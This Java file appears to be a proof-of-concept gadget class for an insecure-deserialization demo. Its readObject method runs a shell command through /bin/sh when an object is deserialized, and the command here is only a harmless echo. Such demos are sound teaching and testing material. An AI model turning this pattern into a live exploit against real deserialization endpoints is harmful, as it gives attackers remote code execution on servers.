package org.example.server.serialize;

import java.io.*;

public class HackObject implements Serializable {

    public HackObject() {

    }
    @Serial
    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException, InterruptedException {
        in.defaultReadObject();

        System.out.println("[HackObject] readObject called");

        String command = "echo 'Hello, this is a malicious message from the shell'";
        Process process = Runtime.getRuntime().exec(new String[] {"/bin/sh", "-c", command});

        // Read and print the output from the command
        BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
        String line;
        while ((line = reader.readLine()) != null) {
            System.out.println(line);  // This prints to stdout in Java, which is typically your console
        }

        // Wait for the process to finish
        process.waitFor();

        // Check the exit value
        int exitValue = process.exitValue();
        System.out.println("Process exited with value: " + exitValue);
    }
}
